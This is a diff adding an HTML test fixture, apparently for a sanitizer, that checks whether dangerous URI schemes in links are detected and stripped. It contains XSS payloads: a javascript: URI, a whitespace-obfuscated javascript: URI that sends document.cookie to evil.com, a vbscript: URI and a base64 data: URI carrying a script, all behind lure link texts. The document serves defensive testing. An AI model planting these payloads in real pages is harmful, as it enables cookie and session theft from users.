@@ -1,0 +1,16 @@
+<div>
+    <h1>Dangerous URI Schemes</h1>
+    <p>Testing detection and stripping of pseudo-protocols in anchor and resource attributes.</p>
+
+    <!-- Standard javascript: pseudo-protocol -->
+    <p><a href="javascript:alert('Direct javascript URI')">Claim Free Reward</a></p>
+
+    <!-- Obfuscated whitespace & control-character protocol dispatch evasion -->
+    <p><a href=" &#x09; &#x0A; javascript:document.location='http://evil.com/c?'+document.cookie">Confirm Payment</a></p>
+
+    <!-- VBScript pseudo-protocol -->
+    <p><a href="vbscript:msgbox('Legacy VBScript Attack')">Legacy Support Link</a></p>
+
+    <!-- Data URI containing executable HTML/JS payload -->
+    <p><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnRGF0YSBVUkkgWFNTJyk8L3NjcmlwdD4=">Embedded HTML Payload</a></p>
+</div>
